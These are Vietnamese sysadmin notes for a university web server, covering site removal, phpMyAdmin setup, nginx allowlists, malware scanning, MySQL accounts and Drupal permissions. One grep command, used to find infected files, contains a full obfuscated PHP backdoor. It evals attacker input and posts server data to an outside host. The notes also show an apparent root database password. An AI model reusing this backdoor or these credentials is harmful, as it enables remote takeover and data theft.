XÓA MỘT TRANG WEB TRONG NUCE.EDU.VN
-------------------------------------------------------------
 pure-pw userdel nuceeduvn
 rm -rf /usr/local/nginx/conf/conf.d/nuce.edu.vn.conf
 rm -rf /usr/local/nginx/conf/conf.d/nuce.edu.vn.ssl.conf
 rm -rf /usr/local/nginx/conf/ssl/nuce.edu.vn/nuce.edu.vn.crt
 rm -rf /usr/local/nginx/conf/ssl/nuce.edu.vn/nuce.edu.vn.key
 rm -rf /usr/local/nginx/conf/ssl/nuce.edu.vn/nuce.edu.vn.csr
 rm -rf /usr/local/nginx/conf/ssl/nuce.edu.vn
 rm -rf /home/nginx/domains/nuce.edu.vn
 rm -rf /root/.acme.sh/nuce.edu.vn
 rm -rf /root/.acme.sh/nuce.edu.vn_ecc
 rm -rf /usr/local/nginx/conf/pre-staticfiles-local-nuce.edu.vn.conf
 service nginx restart


CÀI PHP MYADMIN
-------------------------------------------------------------
- /root/tools/phpmyadmin_uninstall.sh
- cd /usr/local/src/centminmod/addons/
- chmod 0700 /usr/local/src/centminmod/addons/phpmyadmin.sh
- ./phpmyadmin.sh install


CHO PHÉP VÀO TỪ MỌI IP
-------------------------------------------------------------
- nano /usr/local/nginx/conf/phpmyadmin_https.conf
- deny all; => allow all; 
- Hoặc cho phép những IP tĩnh sau:

  #IP TINH O DHXD
  allow 117.1.16.201;
  allow 117.1.16.202;
  allow 117.1.16.203;
  allow 117.1.16.204;
  allow 117.1.16.205;
  allow 117.1.16.206;
  allow 117.4.240.19;
  allow 27.72.100.108;
  allow 118.70.118.138;
  allow 118.70.116.23;
  allow 123.16.13.116;
  allow 117.6.85.13;
  allow 117.6.132.144;
  allow 117.6.87.43;
  #IP O GIAP BAT
  allow 27.73.110.179;
  deny all;
  
- File lưu USER và PASS web access: /usr/local/nginx/conf/htpassphpmyadmin;


 CÀI CHƯƠNG TRÌNH DIỆT VIRUT MALDET:
 ------------------------------------------------------
 Update CSDL: maldet -d
 Quét: maldet -a /home/nginx/domains/nuce.edu.vn 
 Hướng dẫn: https://www.woktron.com/secure/knowledgebase/145/Installation-Linux-Malware-Detect-Maldet-On-CentOS.html
 https://centminmod.com/addons.html#maldet
 

TẠO TÀI KHOẢN MYSQL & THAY PASS
------------------------------------------------------
root\Nuce@123Nuce@123:
# Tạo một tài khoản user1 và cho phép truy cập tất cả các DB
CREATE USER 'user1'@'localhost' IDENTIFIED BY 'matkhau_user1';
GRANT ALL PRIVILEGES ON * . * TO 'user1'@'localhost';
FLUSH PRIVILEGES;

------------------------------------------------------
CẤU HÌNH FILE CONFIG /usr/local/nginx/conf/conf.d/
# quang them loi khong hien thi anh
  location @rewrite {
    rewrite ^ /index.php last;
  }
  location ~* files/styles {
    access_log off;
    expires 30d;
    try_files $uri @rewrite;
  }
  location / {
    try_files $uri $uri/ /index.php?$args;
    include /usr/local/nginx/conf/503include-only.conf; 
    
 ------------------------------------------------------
 PHÂN QUYỀN CÁC THƯ MỤC TRONG DRUPAL 7
- cd /home/nginx/domains/nuce.edu.vn/public
- find . -type d -exec chmod 0555 {} \;
- find . -type f -exec chmod 0444 {} \;
- find sites/default/files -type d -exec chmod 0755 {} \;
- find sites/default/files -type f -exec chmod 0644 {} \;
- there should be no "tmp" directory at drupal root , place tmp outside where hackers can not access with weburl
- https://help.directadmin.com/item.php?id=589
TÌM MỘT FILE
- find . -type f -name '*.php'

- find /home/quangtv.nuce.edu.vn/public_html/ -type f -exec grep -l '#page-title' {} \;
find . -type f -exec grep -l '<?php /*8968665*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KCmlmKCRwYXRjaGVkZnYgPT09ICJHSEtBU01WRyIgKSB7IEBvYl9lbmRfY2xlYW4oKTsgIGRpZTsgIH0KCi8vaWYgKHN0cnBvcygkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sICJXaW4iICkgPT09IGZhbHNlKSB7ICRramRrZV9jID0gMTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly9ub3J0c2VydmlzLm5ldC9zZXNzaW9uLnBocD9pZCIsIGZhbHNlICwkY29udGV4dF9qaGtiKTsKaWYoJHZrZnUpIHsgQGV2YWwoJHZrZnUpOyB9IGVsc2Uge29iX3N0YXJ0KCk7ICBpZighQGhlYWRlcnNfc2VudCgpKSB7IEBzZXRjb29raWUoImNvbmR0aW9ucyIsIjIiLHRpbWUoKSsxNzI4MDApOyB9IGVsc2UgeyBlY2hvICI8c2NyaXB0PmRvY3VtZW50LmNvb2tpZT0nY29uZHRpb25zPTI7IHBhdGg9LzsgZXhwaXJlcz0iLmRhdGUoJ0QsIGQtTS1ZIEg6aTpzJyx0aW1lKCkrMTcyODAwKS4iIEdNVDsnOzwvc2NyaXB0PiI7IH0gO307CiB9CiB9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*8968665*/ ?>' {} \;

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

TOOL kiểm tra blacklist: https://mxtoolbox.com/Public/Login.aspx#/

Nhật ký Block LDF:
- /var/log/lfd.log.

HTACCESS_LOG = "/var/log/httpd/error_log"
MODSEC_LOG = "/var/log/httpd/error_log"
SSHD_LOG = "/var/log/secure"
SU_LOG = "/var/log/secure"
FTPD_LOG = "/var/log/messages"
SMTPAUTH_LOG = "/var/log/secure"
POP3D_LOG = "/var/log/maillog"
IMAPD_LOG = "/var/log/maillog"
IPTABLES_LOG = "/var/log/messages"
SUHOSIN_LOG = "/var/log/messages"
BIND_LOG = "/var/log/messages"
SYSLOG_LOG = "/var/log/messages"
WEBMIN_LOG = "/var/log/secure"

XÓA MỘT SITE TRONG CENTMINMOD
Commands to remove dr9.chinhban.com
pure-pw userdel dr9
 rm -rf /usr/local/nginx/conf/conf.d/dr9.chinhban.com.conf
 rm -rf /usr/local/nginx/conf/conf.d/dr9.chinhban.com.ssl.conf
 rm -rf /usr/local/nginx/conf/ssl/dr9.chinhban.com/dr9.chinhban.com.crt
 rm -rf /usr/local/nginx/conf/ssl/dr9.chinhban.com/dr9.chinhban.com.key
 rm -rf /usr/local/nginx/conf/ssl/dr9.chinhban.com/dr9.chinhban.com.csr
 rm -rf /usr/local/nginx/conf/ssl/dr9.chinhban.com
 rm -rf /home/nginx/domains/dr9.chinhban.com
 rm -rf /root/.acme.sh/dr9.chinhban.com
 rm -rf /root/.acme.sh/dr9.chinhban.com_ecc
 rm -rf /usr/local/nginx/conf/pre-staticfiles-local-dr9.chinhban.com.conf
 service nginx restart

